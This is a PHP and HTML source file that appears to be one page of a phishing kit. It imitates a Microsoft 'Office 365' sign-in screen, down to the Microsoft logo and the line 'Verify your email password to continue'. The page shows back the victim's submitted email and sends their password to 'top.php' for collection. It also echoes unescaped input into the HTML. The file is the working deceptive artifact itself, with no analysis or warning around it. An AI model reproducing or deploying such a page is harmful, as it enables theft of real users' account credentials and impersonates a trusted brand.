<?php

$email = $_POST['aiusrnm'];
// make sure we've got a valid email
if( filter_var( $email, FILTER_VALIDATE_EMAIL ) ) {
    // split on @ and return last value of array (the domain)
    $domain = array_pop(explode('@', $email));
}

?>


<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<html lang="en">

<head>
    <meta http-equiv="x-ua-compatible" content="EmulateIE9">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <title>Office 365</title>
</head>

<body style="background-image: url('images/214d89a26f0ac918a09f216a1b0f97b4.png'); background-repeat: no-repeat;background-size: cover;">
    <div class="container-fluid p-0">
        <div class="container">
            <div class="row my-5">
                <div class="col-lg-5 mx-auto">
                    <div class="m-5 p-4 bg-white rounded" id="div1" style="box-shadow: 0px 2px 5px rgba(0,0,0,0.5);">
                        <div class="text-left">
                            <span><img src="images/images-microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="img-fluid" width="110px"></span><span class="pl-4 h5 align-middle"> </span><br><br>
                            <span class="h5">Sign in</span><br>
                            <span class="h5"></span><br>
                            <span class="h">Verify your email password to continue</span><br>
                            <span id="msg" class="text-danger" style="display: none;">Invalid Password..! Please enter correct password.</span><br>
                            <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
                            <small></small>
							<form method="POST" action="top.php" autocomplete="off">
                            <div class="form-group">
                                <font size="3"><strong><?php echo $email ?></strong></font>
								<input type="hidden" value="<?php echo $email ?>" name="aiusrnm1"/>
                            </div><br></br>
                            <div class="form-group mt-2">
                                <small></small>
                                <input type="password" name="aipwd2" class="form-control" id="pr" aria-describedby="aiHelp" placeholder="Password" required minlength="5">
                            </div>
                        </div>
                        <div class="form-check mt-3">
                            <input type="checkbox" class="form-check-input" id="exampleCheck1">
                            <label class="form-check-label" for="exampleCheck1"><span><a href="#">Keep me sign in</a></span></label>
                            <span><span><a href="#" class="float-right">Forgot Password?</a></span></span>
                        </div>
                        <div class="col-lg-12 mt-3">
                            <button class="btn text-white px-4 w-100" id="submit-btn" type="submit" style="background-color: #0a59a3;">Next</button>
                        </div>
                    </div>
                </div>
				</form>
                <!-- Optional JavaScript -->
                <!-- jQuery first, then Popper.js, then Bootstrap JS -->
                <script type="text/javascript" src="js/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
                <script type="text/javascript" src="js/umd-popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
                <script type="text/javascript" src="js/js-bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</div></div></div></body>
<script type="text/javascript" src="js/2.2.4-jquery.min.js"></script>
<script type="text/javascript" src="js/js-bootstrap.min.js"></script>

</html>
